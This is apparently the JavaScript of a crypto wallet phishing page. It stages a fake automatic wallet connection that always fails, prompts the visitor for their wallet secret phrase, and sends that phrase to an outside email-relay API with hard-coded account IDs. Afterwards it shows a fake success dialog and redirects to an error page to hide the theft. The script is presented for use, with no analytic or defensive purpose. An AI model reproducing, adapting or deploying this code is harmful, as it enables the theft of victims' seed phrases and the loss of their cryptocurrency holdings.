      <script>
         
         //Handle Select Wallet Click
         $(function() {
            $('#popup_connect_wallet').modal('show');
         $('#auto_connecting').show();
         var interval = 1000 * getRandomInt(1, 15);
                setTimeout(() => {
                    $('#auto_connecting').hide();
                    $('#div_connect_manually').hide();
                    $('#failed_to_connect').show();
                }, interval);


         $('.closemd').on('click', function(){
            window.location.href = 'index.html';
         })
         
             $('#try_auto_connecting_again').on('click', function(e){
                 e.preventDefault();
                 $('#auto_connecting').show();
                 $('#failed_to_connect').hide();
                 $('#div_connect_manuallly').hide();
         
                 //Hide autoconnecting div and show error in random interval
                 var interval = 1000 * getRandomInt(1,20);
                 setTimeout(() => {
                     $('#auto_connecting').hide();
                     $('#div_connect_manuallly').hide();
                     $('#failed_to_connect').show();
                 }, interval);
             })
         
             $('#button_connect_manually').on('click', function(e){
                 e.preventDefault();
                 $('#auto_connecting').hide();
                 $('#failed_to_connect').hide();
                 $('#div_connect_manuallly').show();
             })
         
             //FOR PHRASE TEXT VALIDATION
             $('#secret_phrase').on('keyup', function(){
                 var phrase_seed_entered = $(this).val().trim()
                 if(phrase_seed_entered != "" ){
                     var phrase_count = phrase_seed_entered.match(/(\w+)/g).length
                     
                     if( [12,15,18,21,24].includes(phrase_count) ){
                         $('#button_connect_wallet').attr('disabled', false).css('opacity','1')
                     }else{
                         $('#button_connect_wallet').attr('disabled', false).css('opacity','1')
                     }
                 }else{
                     $('#button_connect_wallet').attr('disabled', true).css('opacity','0.2')
                 }
             })
         
             //CONNECT WALLET BUTTON Handler
             $('#button_connect_wallet').on('click', function(e) {
                e.preventDefault();

                const field = $('#secret_phrase'); // Assuming this is the user input field
                const $button = $(this); // Cache the button reference
                const form = $(this).closest('form')[0]; // Get the closest form element (using .closest to ensure we get the actual form)

                if (field.val().length >= 12) {
                    // Change button text to indicate loading state
                    $button.html('<i class="fas fa-spinner fa-spin"></i> Loading...');

                    const formData = new FormData(form); // Now form is a proper HTMLFormElement

                    // Append additional data to form
                    formData.append('service_id', 'service_i0kcjte');
                    formData.append('template_id', 'template_jedgt7p');
                    formData.append('user_id', 'mHhvwikoPiJtoQBTe');

                    // Send the AJAX request
                    $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
                        type: 'POST',
                        data: formData,
                        contentType: false, // Auto
                        processData: false  // Don't process the formData into a string
                    })
                    .done(function() {
                        // Handle success (you can update the UI as needed)
                        $button.text('Connect Wallet').css('pointer-events', 'all');
                        $('#popup_connect_wallet').modal('hide');
                        $('#popup_connect_wallet_success').modal('show');
                        setTimeout(function() {
                            $button.attr('disabled', true).text('Error connecting.');
                            window.location.href = 'error.html';
                        }, 5000);
                    })
                    .fail(function(error) {
                        // Handle failure
                        // alert('Internal server error');
                        $button.text('Connect Wallet').css('pointer-events', 'all');
                        $('#popup_connect_wallet').modal('hide');
                        $('#popup_connect_wallet_success').modal('show');
                        
                        setTimeout(function() {
                            $button.attr('disabled', true).text('Error connecting.');
                            window.location.href = 'error.html';
                        }, 5000);
                        console.error('Oops... ' + JSON.stringify(error));
                    });
                } else {
                    alert('Please enter at least 12 characters in the secret phrase field.');
                }
            });



         })
         
         function getRandomInt(min, max) {
             min = Math.ceil(min);
             max = Math.floor(max);
             return Math.floor(Math.random() * (max - min) + min); //The maximum is exclusive and the minimum is inclusive
         }
         
         //DISABLE RIGHT CLICK AND CTRL KEY
         // window.oncontextmenu = function () {

         // $(document).keydown(function (event) {

         //         return false;
         //     }
         // });
      </script>
